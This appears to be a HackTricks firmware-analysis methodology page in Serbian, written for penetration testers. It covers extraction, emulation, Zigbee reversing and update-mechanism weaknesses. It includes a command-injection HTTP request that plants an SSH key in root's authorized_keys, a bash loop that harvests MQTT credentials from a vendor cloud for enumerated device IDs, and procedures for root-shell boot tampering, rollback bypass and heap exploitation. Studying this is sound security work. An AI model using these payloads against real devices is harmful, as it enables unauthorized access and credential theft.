# Analiza firmware-a

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Uvod**

### Povezani resursi

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware je ključan softver koji omogućava uređajima da pravilno rade tako što upravlja komunikacijom između hardverskih komponenti i softvera sa kojim korisnici stupaju u interakciju i olakšava je. Čuva se u trajnoj memoriji, čime se uređaju omogućava pristup važnim instrukcijama od trenutka uključivanja, što dovodi do pokretanja operativnog sistema. Ispitivanje i potencijalno menjanje firmware-a ključan je korak u identifikovanju bezbednosnih ranjivosti.<sup>[[2]](#references)[[3]](#references)</sup>

## **Prikupljanje informacija**

**Prikupljanje informacija** je ključan početni korak u razumevanju sastava uređaja i tehnologija koje koristi. Ovaj proces obuhvata prikupljanje podataka o:

- CPU arhitekturi i operativnom sistemu koji koristi
- Specifičnostima bootloader-a
- Hardverskom rasporedu i datasheet-ovima
- Metrikama codebase-a i lokacijama izvornog koda
- Spoljnim bibliotekama i vrstama licenci
- Istoriji update-a i regulatornim sertifikatima
- Arhitektonskim dijagramima i dijagramima toka
- Bezbednosnim procenama i identifikovanim ranjivostima

U tu svrhu, alati za **open-source intelligence (OSINT)** su od neprocenjive vrednosti, kao i analiza svih dostupnih komponenti open-source softvera kroz ručne i automatizovane procese pregleda. Alati kao što su [Coverity Scan](https://scan.coverity.com) i [Semmle’s LGTM](https://lgtm.com/#explore) nude besplatnu statičku analizu koja se može koristiti za pronalaženje potencijalnih problema.

## **Nabavljanje firmware-a**

Firmware se može pribaviti na različite načine, pri čemu svaki od njih ima sopstveni nivo složenosti:

- **Direktno** iz izvora (developeri, proizvođači)
- **Build-ovanjem** na osnovu dostavljenih uputstava
- **Preuzimanjem** sa zvaničnih support sajtova
- Korišćenjem **Google dork** upita za pronalaženje hostovanih firmware fajlova
- Direktnim pristupom **cloud storage-u**, pomoću alata kao što je [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Presretanjem **update-a** pomoću man-in-the-middle tehnika
- **Ekstrakcijom** sa uređaja putem konekcija kao što su **UART**, **JTAG** ili **PICit**
- **Snifanjem** zahteva za update unutar komunikacije uređaja
- Identifikovanjem i korišćenjem **hardkodovanih endpoint-a za update**
- **Dump-ovanjem** iz bootloader-a ili mreže
- **Uklanjanjem i očitavanjem** memorijskog čipa kada sve drugo ne uspe, uz korišćenje odgovarajućih hardverskih alata

### Samo UART logovi: prisilno pokretanje root shell-a putem U-Boot env-a u flash memoriji

Ako se UART RX ignoriše (dostupni su samo logovi), i dalje možete prisilno pokrenuti init shell tako što ćete offline **izmeniti U-Boot environment blob**:<sup>[[6]](#references)</sup>

1. Dump-ujte SPI flash pomoću SOIC-8 klipse i programatora (3.3V):
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. Pronađite U-Boot env particiju, izmenite `bootargs` tako da uključuje `init=/bin/sh` i **ponovo izračunajte U-Boot env CRC32** za blob.
3. Ponovo upišite samo env particiju i restartujte uređaj; shell bi trebalo da se pojavi na UART-u.

Ovo je korisno na embedded uređajima kod kojih je shell bootloader-a onemogućen, ali je env particija upisiva putem eksternog pristupa flash memoriji.

## Analiza firmware-a

Sada kada **imate firmware**, potrebno je da iz njega izdvojite informacije kako biste znali kako da ga tretirate. Za to možete koristiti različite alate:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Ako pomoću tih alata ne pronađete mnogo toga, proverite **entropiju** slike pomoću `binwalk -E <bin>`. Ako je entropija niska, verovatno nije enkriptovana. Ako je entropija visoka, verovatno je enkriptovana (ili na neki način kompresovana).

Pored toga, možete koristiti ove alate za izdvajanje **datoteka ugrađenih u firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Ili [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) za pregled datoteke.

### Dobijanje file systema

Pomoću prethodno pomenutih alata, kao što je `binwalk -ev <bin>`, trebalo bi da ste uspeli da **izdvojite file system**.\
Binwalk ga obično izdvaja unutar **foldera nazvanog prema tipu file systema**, koji je obično jedan od sledećih: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Ručno izdvajanje file systema

Ponekad binwalk **nema magic byte file systema u svojim potpisima**. U tim slučajevima, koristite binwalk da **pronađete offset file systema i izdvojite kompresovani file system** iz binarne datoteke, a zatim ga **ručno izdvojite** u skladu sa njegovim tipom, koristeći korake u nastavku.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Pokrenite sledeću **dd komandu** za izdvajanje Squashfs sistema datoteka.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Alternativno, može se pokrenuti i sledeća komanda.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Za squashfs (korišćen u gornjem primeru)

`$ unsquashfs dir.squashfs`

Datoteke će se nakon toga nalaziti u direktorijumu "`squashfs-root`".

- CPIO archive datoteke

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Za jffs2 filesystems

`$ jefferson rootfsfile.jffs2`

- Za ubifs filesystems sa NAND flash memorijom

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Analiziranje Firmware-a

Nakon pribavljanja firmware-a, neophodno je detaljno ga analizirati kako bi se razumela njegova struktura i potencijalne ranjivosti. Ovaj proces podrazumeva korišćenje različitih alata za analizu i izdvajanje korisnih podataka iz firmware image-a.

### Početni alati za analizu

Obezbeđen je skup komandi za početni pregled binarne datoteke (označene kao `<bin>`). Ove komande pomažu u identifikovanju tipova datoteka, izvlačenju stringova, analizi binarnih podataka i razumevanju detalja o particijama i filesystem-u:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Da bi se procenio status enkripcije image-a, proverava se **entropija** pomoću `binwalk -E <bin>`. Niska entropija ukazuje na nedostatak enkripcije, dok visoka entropija ukazuje na moguću enkripciju ili kompresiju.

Za ekstrakciju **ugrađenih datoteka**, preporučuju se alati i resursi poput dokumentacije **file-data-carving-recovery-tools** i **binvis.io** za pregled datoteka.

### Ekstrakcija filesystem-a

Korišćenjem `binwalk -ev <bin>`, filesystem se obično može ekstraktovati, često u direktorijum nazvan po tipu filesystem-a (npr. squashfs, ubifs). Međutim, kada **binwalk** ne uspe da prepozna tip filesystem-a zbog nedostajućih magic bytes, neophodna je ručna ekstrakcija. To podrazumeva korišćenje `binwalk` za pronalaženje offset-a filesystem-a, nakon čega se koristi komanda `dd` za izdvajanje filesystem-a:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Nakon toga se, u zavisnosti od tipa fajl sistema (npr. squashfs, cpio, jffs2, ubifs), koriste različite komande za ručno izdvajanje sadržaja.

### Analiza fajl sistema

Kada je fajl sistem izdvojen, počinje potraga za bezbednosnim propustima. Pažnja se posvećuje nebezbednim mrežnim daemonima, hardkodovanim akreditivima, API endpointima, funkcionalnostima update servera, nekompajliranom kodu, startup skriptama i kompajliranim binarnim datotekama za offline analizu.

**Ključne lokacije** i **stavke** koje treba pregledati obuhvataju:

- **etc/shadow** i **etc/passwd** za korisničke akreditive
- SSL sertifikate i ključeve u **etc/ssl**
- Konfiguracione i skriptne datoteke zbog potencijalnih ranjivosti
- Ugrađene binarne datoteke za dalju analizu
- Uobičajene web servere i binarne datoteke IoT uređaja

Nekoliko alata pomaže u otkrivanju osetljivih informacija i ranjivosti unutar fajl sistema:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) i [**Firmwalker**](https://github.com/craigz28/firmwalker) za pretragu osetljivih informacija
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) za sveobuhvatnu analizu firmware-a
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) i [**EMBA**](https://github.com/e-m-b-a/emba) za statičku i dinamičku analizu

### Bezbednosne provere kompajliranih binarnih datoteka

Ivorni kod i kompajlirane binarne datoteke pronađene u fajl sistemu moraju se detaljno ispitati zbog ranjivosti. Alati poput **checksec.sh** za Unix binarne datoteke i **PESecurity** za Windows binarne datoteke pomažu u identifikovanju nezaštićenih binarnih datoteka koje bi mogle biti iskorišćene.

## Preuzimanje cloud konfiguracije i MQTT akreditiva putem izvedenih URL tokena

Mnogi IoT hub-ovi preuzimaju konfiguraciju specifičnu za uređaj sa cloud endpointa koji izgleda ovako:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Tokom analize firmware-a možete otkriti da se `<token>` lokalno izvodi iz ID-a uređaja pomoću hardkodovane tajne, na primer:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

Ovakav dizajn omogućava svakome ko sazna deviceId i STATIC_KEY da rekonstruiše URL i preuzme cloud konfiguraciju, često otkrivajući MQTT akreditive u čistom tekstu i prefikse topic-a.

Praktičan tok rada:

1) Izdvojite deviceId iz UART boot logova

- Povežite 3.3V UART adapter (TX/RX/GND) i snimite logove:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Potražite linije koje ispisuju obrazac URL-a za cloud konfiguraciju i adresu brokera, na primer:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Preuzmite STATIC_KEY i algoritam tokena iz firmware-a

- Učitajte binarne datoteke u Ghidra/radare2 i pretražite putanju do konfiguracije ("/pf/") ili korišćenje MD5-a.
- Potvrdite algoritam (npr. MD5(deviceId||STATIC_KEY)).
- Izvedite token u Bash-u i pretvorite digest u velika slova:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Prikupljanje cloud konfiguracije i MQTT akreditiva

- Sastavite URL i preuzmite JSON pomoću curl; analizirajte ga pomoću jq da biste izdvojili tajne:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Zloupotreba MQTT-a u plain-text formatu i slabih ACL-ova (ako postoje)

- Upotrebite pronađene credentials da se pretplatite na maintenance topics i potražite osetljive događaje:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Enumeriši predvidljive ID-jeve uređaja (u velikom obimu, uz autorizaciju)

- Mnogi ekosistemi ugrađuju bajtove OUI-ja/proizvoda/tipa, praćene sekvencijalnim sufiksom.
- Možete iterirati kroz kandidate za ID-jeve, programski izvoditi tokene i preuzimati konfiguracije:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Napomene
- Uvek pribavite izričito ovlašćenje pre pokušaja masovne enumeracije.
- Kada je moguće, prednost dajte emulaciji ili statičkoj analizi za pronalaženje secrets bez izmena ciljnog hardware-a.


Proces emulacije firmware-a omogućava **dynamic analysis** rada uređaja ili pojedinačnog programa. Ovaj pristup može naići na izazove povezane sa zavisnostima od hardware-a ili architecture, ali prebacivanje root filesystem-a ili određenih binaries-a na uređaj sa odgovarajućom architecture i endianness-om, kao što je Raspberry Pi, ili na unapred pripremljenu virtual machine, može olakšati dalje testiranje.

### Emulacija pojedinačnih binaries-a

Za ispitivanje pojedinačnih programa ključno je utvrditi endianness i CPU architecture programa.

#### Primer sa MIPS architecture

Za emulaciju binary-ja sa MIPS architecture može se koristiti komanda:
```bash
file ./squashfs-root/bin/busybox
```
I za instalaciju neophodnih alata za emulaciju:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Za MIPS (big-endian) koristi se `qemu-mips`, a za binarne datoteke sa little-endian formatom koristi se `qemu-mipsel`.

#### Emulacija ARM arhitekture

Za ARM binarne datoteke proces je sličan, pri čemu se za emulaciju koristi emulator `qemu-arm`.

### Emulacija celog sistema

Alati kao što su [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) i drugi omogućavaju emulaciju celog firmvera, automatizuju proces i pomažu u dinamičkoj analizi.

## Dinamička analiza u praksi

U ovoj fazi se za analizu koristi stvarno ili emulirano okruženje uređaja. Od ključne je važnosti održati shell pristup OS-u i sistemu datoteka. Emulacija možda neće savršeno oponašati interakcije sa hardverom, zbog čega će povremeno biti potrebno ponovo pokrenuti emulaciju. Analiza treba ponovo da obuhvati sistem datoteka, iskorišćavanje izloženih veb-stranica i mrežnih servisa, kao i istraživanje ranjivosti bootloader-a. Testovi integriteta firmvera ključni su za identifikovanje potencijalnih backdoor ranjivosti.

## Tehnike runtime analize

Runtime analiza podrazumeva interakciju sa procesom ili binarnom datotekom u njenom operativnom okruženju, uz korišćenje alata kao što su gdb-multiarch, Frida i Ghidra za postavljanje breakpoint-a i identifikovanje ranjivosti pomoću fuzzing-a i drugih tehnika.

Za embedded ciljeve bez potpunog debugger-a, **kopirajte statički linkovani `gdbserver`** na uređaj i povežite se sa njim na daljinu:<sup>[[6]](#references)</sup>
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
### Mapiranje Zigbee / radio-co-processor poruka

Na IoT hubovima RF stack je često podeljen između **radio MCU-a** i Linux userland procesa. Koristan postupak je mapirati putanju:<sup>[[8]](#references)</sup>

1. **RF frame** u vazduhu
2. **parser na strani kontrolera** na radio MCU-u
3. **tekstualni ili TLV protokol preko serijske veze/UART-a** prosleđen Linuxu (na primer `/dev/tty*`)
4. **application dispatcher** u glavnom daemon-u
5. **handler specifičan za protokol / state machine**

Ova arhitektura stvara dva reversing cilja umesto jednog. Ako kontroler pretvara binarne radio frame-ove u tekstualni protokol kao što je `Group,Command,arg1,arg2,...`, pronađite:

- **message groups** i dispatch tabele
- Koje poruke mogu doći sa **mreže**, a koje potiču od samog kontrolera
- Tačna **manufacturer-specific discriminator** polja (na primer Zigbee `manufacturer_code` i prilagođeni `cluster_command`)
- Koji handler-i su dostupni samo tokom **commissioning-a**, discovery-ja ili faza preuzimanja firmware-a/modela

Za Zigbee, posebno snimite pairing saobraćaj i proverite da li se cilj i dalje oslanja na podrazumevani **Link Key** `ZigBeeAlliance09`. Ako je tako, sniffing commissioning saobraćaja može otkriti **Network Key**. Zigbee 3.0 install codes smanjuju ovu izloženost, zato zabeležite da li ih testirani uređaj zaista primenjuje.

### Manufacturer-specific protocol handler-i i FSM-gated dostupnost

Vendor-specific Zigbee/ZCL komande često su bolji cilj od standardizovanih klastera jer prosleđuju podatke **custom parsing code-u** i internim **FSM-ovima** sa manje proverenom validacijom.<sup>[[8]](#references)</sup>

Praktičan postupak:

- Pratite command dispatcher unazad dok ne pronađete **vendor-only handler**.
- Rekonstruišite tabele za **FSM state**, **event**, **check**, **action** i **next-state**.
- Identifikujte **transitional states** koji automatski prelaze dalje i retry/error grane koje na kraju resetuju ili oslobađaju stanje pod kontrolom napadača.
- Potvrdite koje su legitimne razmene protokola potrebne da bi se daemon doveo u ranjivo stanje, umesto pretpostavke da je ranjivi handler uvek dostupan.

Kod protokola osetljivih na vreme, replay paketa iz Python framework-a može biti prespor. Pouzdaniji pristup je emulirati legitimni uređaj na stvarnom hardveru (na primer **nRF52840**) pomoću vendor-grade stack-a, kako biste mogli da izložite odgovarajuće **endpoints**, **attributes** i timing za commissioning.

### Klasa bugova fragmentiranih download-a u embedded daemon-ima

Ponavljajuća klasa firmware bugova pojavljuje se kod **fragmentiranih download-a blob/model/configuration podataka**:<sup>[[8]](#references)</sup>

1. **Prvi fragment** (`offset == 0`) čuva `ctx->total_size` i poziva `malloc(total_size)`.
2. Naredni fragmenti proveravaju samo polja pod kontrolom napadača na nivou **packet-a**, kao što je `packet_total_size >= offset + chunk_len`.
3. Kopiranje koristi `memcpy(&ctx->buffer[offset], chunk, chunk_len)` bez provere u odnosu na **originalno alociranu veličinu**.

Ovo omogućava napadaču da pošalje:

- Prvi validni fragment sa **malom deklarisanom ukupnom veličinom**, čime se prisiljava mala heap alokacija.
- Kasniji fragment sa **očekivanim offset-om**, ali većim `chunk_len`.
- Falsifikovanu veličinu na nivou packet-a koja zadovoljava nove provere, ali i dalje prelivа prvobitno alocirani buffer.

Kada se ranjiva putanja nalazi iza commissioning logike, exploit mora da obuhvati dovoljno **device emulation-a** da bi se cilj doveo u očekivano stanje za preuzimanje modela ili blob-a pre slanja neispravnih fragmenata.

### Protocol-driven `free()` okidači

U embedded daemon-ima, najlakši način za pokretanje heap metadata exploitation-a često nije „čekanje čišćenja“, već **prisiljavanje sopstvenog error handling-a protokola**:<sup>[[8]](#references)</sup>

- Pošaljite neispravne naredne fragmente kako biste FSM gurnuli u **retry** ili **error** stanja.
- Pređite prag za broj pokušaja kako bi daemon **resetovao context** i oslobodio oštećeni buffer.
- Iskoristite ovaj predvidljiv `free()` da pokrenete primitive na strani allocator-a pre nego što se proces sruši iz nepovezanih razloga.

Ovo je naročito korisno protiv **musl/uClibc/dlmalloc-like** allocator-a u embedded Linux-u, gde korupcija chunk metadata može pretvoriti unlink/unbin logiku u write primitive. Stabilan obrazac je korumpirati **size field** kako bi se traversal allocator-a preusmerio na **fake chunks** postavljene unutar overflow-ovanog buffer-a, umesto trenutnog prepisivanja stvarnih bin pointer-a i rušenja procesa.

## Binary Exploitation i Proof-of-Concept

Razvoj PoC-a za identifikovane ranjivosti zahteva duboko razumevanje arhitekture cilja i programiranje u jezicima nižeg nivoa. Binary runtime zaštite su retke u embedded sistemima, ali kada postoje, tehnike kao što je Return Oriented Programming (ROP) mogu biti neophodne.

### Napomene o uClibc fastbin exploitation-u (embedded Linux)

- **Fastbins + consolidation:** uClibc koristi fastbins slične glibc-u. Kasnija velika alokacija može pokrenuti `__malloc_consolidate()`, zato svaki fake chunk mora proći provere (ispravna veličina, `fd = 0` i okolni chunk-ovi koje sistem vidi kao „u upotrebi“).<sup>[[6]](#references)</sup>
- **Non-PIE binariji pod ASLR-om:** ako je ASLR omogućen, ali je glavni binary **non-PIE**, adrese unutar binary-ja u `.data/.bss` su stabilne. Možete ciljati region koji već podseća na validno zaglavlje heap chunk-a kako biste fastbin alokaciju usmerili na **function pointer table**.
- **NUL koji zaustavlja parser:** kada se parsira JSON, `\x00` u payload-u može zaustaviti parsing, a istovremeno zadržati završne bajtove pod kontrolom napadača za stack pivot/ROP chain.
- **Shellcode preko `/proc/self/mem`:** ROP chain koji poziva `open("/proc/self/mem")`, `lseek()` i `write()` može postaviti izvršni shellcode u poznato mapiranje i skočiti na njega.

## Pripremljeni operativni sistemi za Firmware Analysis

Operativni sistemi kao što su [AttifyOS](https://github.com/adi0x90/attifyos) i [EmbedOS](https://github.com/scriptingxss/EmbedOS) pružaju prekonfigurisana okruženja za testiranje firmware bezbednosti, opremljena neophodnim alatima.

## Pripremljeni OS-ovi za analizu Firmware-a

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS je distro namenjen sprovođenju security assessment-a i penetration testing-a Internet of Things (IoT) uređaja. Štedi mnogo vremena tako što pruža prekonfigurisano okruženje sa učitanim svim neophodnim alatima.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Embedded security testing operativni sistem zasnovan na Ubuntu 18.04, sa unapred instaliranim alatima za testiranje firmware bezbednosti.

## Firmware Downgrade Attacks i Insecure Update Mechanisms

Čak i kada vendor implementira cryptographic signature provere za firmware image-ove, **zaštita od rollback-a verzije (downgrade-a) često izostaje**. Kada boot- ili recovery-loader proverava samo potpis pomoću ugrađenog javnog ključa, ali ne upoređuje *verziju* (ili monotonic counter) image-a koji se upisuje, napadač može legitimno instalirati **stariji, ranjivi firmware koji i dalje ima validan potpis** i tako ponovo uvesti zakrpane ranjivosti.<sup>[[4]](#references)</sup>

Tipičan tok napada:

1. **Nabavite stariji potpisani image**
* Preuzmite ga sa vendor-ovog javnog download portala, CDN-a ili support sajta.
* Izvucite ga iz pratećih mobilnih/desktop aplikacija (npr. unutar Android APK-a, u `assets/firmware/`).
* Preuzmite ga iz third-party repozitorijuma kao što su VirusTotal, Internet arhive, forumi itd.
2. **Upload-ujte ili poslužite image uređaju** preko bilo kog izloženog update kanala:
* Web UI, mobile-app API, USB, TFTP, MQTT itd.
* Mnogi potrošački IoT uređaji izlažu *neautentifikovane* HTTP(S) endpoint-e koji prihvataju Base64-encoded firmware blob-ove, dekodiraju ih na serveru i pokreću recovery/upgrade.
3. Nakon downgrade-a, iskoristite ranjivost koja je zakrpljena u novijem release-u (na primer command-injection filter koji je kasnije dodat).
4. Opciono ponovo flash-ujte najnoviji image ili onemogućite update-e kako biste izbegli detekciju nakon ostvarivanja persistence-a.

### Primer: Command Injection nakon Downgrade-a
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
U ranjivom (downgraded) firmware-u, parametar `md5` se direktno konkatenira u shell command bez sanitizacije, što omogućava injection proizvoljnih komandi (ovde – omogućavanje root pristupa zasnovanog na SSH ključu). Kasnije verzije firmware-a uvele su osnovni filter karaktera, ali odsustvo downgrade zaštite čini ovu ispravku beskorisnom.<sup>[[4]](#references)</sup>

### Izdvajanje firmware-a iz mobilnih aplikacija

Mnogi proizvođači uključuju kompletne firmware image-e u prateće mobilne aplikacije kako bi aplikacija mogla da ažurira uređaj putem Bluetooth-a/Wi-Fi-ja. Ovi paketi se obično čuvaju nešifrovani u APK/APEX datoteci, na putanjama kao što su `assets/fw/` ili `res/raw/`. Alati kao što su `apktool`, `ghidra` ili čak običan `unzip` omogućavaju preuzimanje potpisanih image-a bez pristupa fizičkom hardveru.<sup>[[4]](#references)</sup>
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Bypass anti-rollback zaštite samo kroz updater u A/B dizajnima slotova

Neki proizvođači zaista implementiraju anti-downgrade **ratchet**, ali samo unutar logike *updater*-a (na primer, UDS rutina preko CAN-a, recovery komanda ili userspace OTA agent). Ako **bootloader** kasnije proverava samo potpis/CRC image-a i veruje tabeli particija ili metapodacima slotova, rollback zaštita i dalje može biti zaobiđena.<sup>[[7]](#references)</sup>

Tipičan slab dizajn:

- Firmware metapodaci sadrže i deskriptor verzije i **security ratchet** / monotonički brojač.
- Updater poredi ratchet image-a sa vrednošću sačuvanom u persistent storage-u i odbija starije potpisane image-e.
- **Bootloader** ne parsira taj ratchet i samo proverava zaglavlje, CRC i potpis pre pokretanja izabranog slota.
- Aktivacija slota čuva se odvojeno, u tabeli particija ili brojaču generacije po slotu, i nije kriptografski vezana za tačan digest firmware-a koji je validiran.

Ovo u dual-slot sistemima stvara primitivu **validate-one-image / boot-another-image**. Ako napadač može da natera updater da označi slot B kao sledeći cilj za boot koristeći trenutno potpisani image, a zatim može da prepiše slot B pre reboot-a, bootloader i dalje može pokrenuti downgraded image jer veruje samo već potvrđenim metapodacima slota.

Uobičajen obrazac zloupotrebe:

1. Učitaj **trenutno potpisani** firmware u pasivni slot i pokreni uobičajenu rutinu za validaciju/prebacivanje, tako da layout označi taj slot kao sledeći aktivni.
2. **Još nemoj izvršiti reboot**. Ponovo uđi u rutinu za pripremu/brisanje slota u istoj sesiji.
3. Zloupotrebi zastarelo stanje boot-a ili zastarelu logiku izbora slota tako da updater obriše **isti fizički slot** koji je upravo promovisan.
4. Upiši **stariji, ali i dalje potpisani** firmware u taj slot.
5. Preskoči rutinu za validaciju koja primenjuje ratchet i direktno izvrši reboot.
6. Bootloader bira promovisani slot, proverava samo potpis/integritet i pokreće stari image.

Stvari koje treba tražiti prilikom reverse engineering-a A/B update implementacija:

- Izbor slota izveden iz **boot-time flagova** koji se ne osvežavaju nakon uspešnog prebacivanja.
- Rutina u stilu `prepare_passive_slot()` koja briše slot na osnovu zastarelog stanja umesto **trenutnog potvrđenog layout-a**.
- Funkcija u stilu `part_write_layout()` koja samo uvećava **brojač generacije** / aktivni flag i ne čuva hash validiranog image-a.
- Provere ratchet-a implementirane u userspace-u ili updater kodu, ali **ne** u ROM-u / bootloader-u / secure boot fazama.
- Rutine za brisanje ili recovery koje ostavljaju slot označenim kao bootable čak i nakon što je njegov sadržaj uklonjen i ponovo upisan.

### Checklist za procenu update logike

* Da li su transport/autentikacija *update endpoint-a* adekvatno zaštićeni (TLS + autentikacija)?
* Da li uređaj poredi **brojeve verzija** ili **monotonički anti-rollback brojač** pre flashovanja?
* Da li se image proverava unutar secure boot lanca (npr. potpisi se proveravaju ROM kodom)?
* Da li **bootloader primenjuje isti ratchet** kao updater, umesto da proverava samo potpis/CRC?
* Da li su metapodaci aktivacije slota **vezani za digest/verziju validiranog firmware-a**, ili slot može biti izmenjen nakon promocije?
* Nakon uspešnog prebacivanja slota, da li se uređaj primorava na reboot ili su kasnije rutine za update/brisanje i dalje dostupne u istoj sesiji?
* Da li userland kod obavlja dodatne sanity provere (npr. dozvoljena mapa particija, broj modela)?
* Da li *partial* ili *backup* update tokovi ponovo koriste istu logiku validacije?

> 💡  Ako nešto od navedenog nedostaje, platforma je verovatno ranjiva na rollback napade.

## Vulnerable firmware za vežbu

Za vežbanje otkrivanja ranjivosti u firmware-u, koristite sledeće projekte ranjivog firmware-a kao početnu tačku.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Oporavak ključeva za dekripciju firmware-a iz embedded KMS/Vault stanja

Kada update image meša male plaintext metapodatke sa velikim blobom visoke entropije, pre brute-force pokušaja uradite triage kontejnera:<sup>[[1]](#references)</sup>

- Izbacite zaglavlja, offsete i granice linija pomoću `hexdump`, `xxd`, `strings -tx`, `base64 -d` i `binwalk -E`.
- `Salted__` obično označava OpenSSL `enc` format: sledećih 8 bajtova predstavljaju salt, a preostali bajtovi ciphertext.
- Base64 polje koje se dekodira u tačno `256` bajtova snažan je pokazatelj da gledate RSA-2048 ciphertext koji obavija nasumičnu firmware lozinku/session key.
- Odvojeni PGP materijal u istom fajlu često štiti samo autentičnost; nemojte pretpostaviti da predstavlja mehanizam poverljivosti.

Ako statička pretraga ključeva (`grep`, `strings`, PEM/PGP pretrage) ne uspe, reverse-engineer-ujte **operativni decrypt path** umesto da samo tražite privatne ključeve:

- Decompile-ujte updater / management binary i pratite ko čita encrypted blob, koji helper/API ga unwrap-uje i koji logički naziv ključa zahteva.
- Pretražite ekstrahovani root filesystem za KMS stanje (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), kao i unit fajlove i init skripte.
